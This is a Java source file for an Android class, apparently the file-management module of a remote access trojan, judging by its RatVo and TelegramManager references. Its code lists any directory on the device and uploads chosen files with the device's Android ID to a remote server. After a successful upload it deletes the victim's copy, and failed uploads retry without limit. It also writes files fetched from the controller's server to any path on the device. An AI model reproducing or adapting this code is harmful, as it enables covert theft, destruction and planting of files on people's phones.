package com.hhm.android.otherapp.managers;


import android.content.Context;
import android.os.Environment;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.hhm.android.otherapp.Https.API;
import com.hhm.android.otherapp.TelegramManager;
import com.hhm.android.otherapp.utils.RatVo;
import com.jakewharton.retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static com.hhm.android.otherapp.TelegramManager.localVersionName;

/**
 * 文件管理 2020/11/12 by huangche
 *  列目录
 *  文件上传
 *  文件下载
 */
public class FileManager {
    public static final String TAG = "FileManager";

    // 获取 path 目录下文件列表
    public static JsonArray walk(String path){
        JsonArray val = new JsonArray();

        /*File dir;
        if (Environment.getRootDirectory().getParentFile().canRead()){
            dir = new File(path);
        } else {
            if (path.equals("/")){
                dir = Environment.getExternalStorageDirectory();
            } else {
                dir = new File(Environment.getExternalStorageDirectory() + path);
            }
        }*/

        File dir = new File(path);
        File[] list = dir.listFiles();
        try {
            if (list != null) {
                JsonObject parenttObj = new JsonObject();
                parenttObj.addProperty("name", "../");
                parenttObj.addProperty("isDir", true);
                parenttObj.addProperty("size",0);
                String R = dir.canRead() ? "1" : "0";
                String W = dir.canWrite() ? "1" : "0";
                String E = dir.canExecute() ? "1" : "0";
                String Permission = R + W + E;
                parenttObj.addProperty("permission", Permission);
                /*if (!Environment.getRootDirectory().getParentFile().canRead()){
                    String str = dir.getParent();
                    int index = str.indexOf("/");
                    String newStr = str.substring(index + 1);
                    int index1 = newStr.indexOf("/");
                    String newStr1 = newStr.substring(index1 + 1);
                    int index2 = newStr1.indexOf("/");
                    String newStr2 = newStr1.substring(index2 + 1);
                    int index3 = newStr2.indexOf("/");
                    String newStr3 = newStr2.substring(index3 + 1);
                    parenttObj.addProperty("path", newStr3);
                } else {
                    parenttObj.addProperty("path", dir.getParent());
                }*/
                parenttObj.addProperty("path", dir.getParent());
                val.add(parenttObj);

                for (File file : list) {
                    JsonObject fileObj = new JsonObject();
                    fileObj.addProperty("name", file.getName());
                    fileObj.addProperty("isDir", file.isDirectory());
                    if (file.isDirectory()){
                        fileObj.addProperty("size",0);
                    } else {
                        fileObj.addProperty("size",file.length()/1024);
                    }
                    String r = file.canRead() ? "1" : "0";
                    String w = file.canWrite() ? "1" : "0";
                    String e = file.canExecute() ? "1" : "0";
                    String permission = r + w + e;
                    fileObj.addProperty("permission", permission);
                    /*if (!Environment.getRootDirectory().getParentFile().canRead()){
                        String str = file.getAbsolutePath();
                        int index = str.indexOf("/");
                        String newStr = str.substring(index + 1);
                        int index1 = newStr.indexOf("/");
                        String newStr1 = newStr.substring(index1 + 1);
                        int index2 = newStr1.indexOf("/");
                        String newStr2 = newStr1.substring(index2 + 1);
                        int index3 = newStr2.indexOf("/");
                        String newStr3 = newStr2.substring(index3 + 1);
                        fileObj.addProperty("path", newStr3);
                    } else {
                        fileObj.addProperty("path", file.getAbsolutePath());
                    }*/
                    fileObj.addProperty("path", file.getAbsolutePath());
                    val.add(fileObj);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return val;
    }

    // 下载文件
    public static void downloadFile(Context context,String path,int action_id,String url){
        if (path == null)
            return;
        /*if (!Environment.getRootDirectory().getParentFile().canRead()){
            path = Environment.getExternalStorageDirectory() + path;
        }*/
        File file = new File(path);
        if (file.exists()){
            SendFile(context,file,action_id,url);
        }
    }


    //文件上传
    public static void UploadFile(String path, String downloadUrl){
        /*if (!Environment.getRootDirectory().getParentFile().canRead()){
            path = Environment.getExternalStorageDirectory() + path;
        }*/
        try{
            String url = TelegramManager.url + downloadUrl;
            String filename = path.substring(path.lastIndexOf("/") + 1);
            String pathname = path.substring(0, path.lastIndexOf("/"));
            URL myURL = new URL(url);
            URLConnection conn = myURL.openConnection();
            conn.setRequestProperty("Accept-Encoding", "identity");
            conn.connect();
            InputStream is = conn.getInputStream();
            Log.d(TAG, "UploadFile:" + conn.getContentLength());
            int fileSize = conn.getContentLength();
            if (fileSize <= 0) throw new RuntimeException("无法获知文件大小");
            if (is == null) throw new RuntimeException("stream is null");
            FileOutputStream fos = new FileOutputStream(pathname + "/" + filename);
            byte[] buf = new byte[1024];
            int downLoadFileSize = 0;
            do{
                int numread = is.read(buf);
                if (numread == -1) {
                    break;
                }
                fos.write(buf,0, numread);
                downLoadFileSize += numread;
            } while (true);
            Log.e(TAG,"UploadFile():success");
            is.close();
        } catch (Exception ex) {
            Log.e(TAG,"UploadFile():error: " + ex.getMessage(), ex);
        }
    }


    // 文件数据结果上报
    public static void SendFile(final Context context, final File file, final int action_id, final String url){
        RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID))
                .addFormDataPart("device_name", "")
                .addFormDataPart("os", "AND")
                .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
                .addFormDataPart("version", localVersionName(context))
                .addFormDataPart("down_delay", "-1")
                .addFormDataPart("action_id", String.valueOf(action_id))
                .addFormDataPart("code", String.valueOf(0))
                .addFormDataPart("msg", "success")
                .addFormDataPart("file_name", file.getName())
                .addFormDataPart("file", file.getName(), RequestBody.create(MultipartBody.FORM, file))
                .build();

        Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
                .addConverterFactory(GsonConverterFactory.create())
                .addCallAdapterFactory(RxJava2CallAdapterFactory.create()).build();
        API api = retrofit.create(API.class);
        Call<RatVo> call = api.file(requestBody);
        call.enqueue(new Callback<RatVo>() {
            @Override
            public void onResponse(Call<RatVo> call, Response<RatVo> response) {
                Log.v("Upload", "success");
                file.delete();
            }

            @Override
            public void onFailure(Call<RatVo> call, Throwable t) {
                Log.e("Upload error:", t.getMessage());
                SendFile(context,file,action_id,url);
            }
        });
    }

}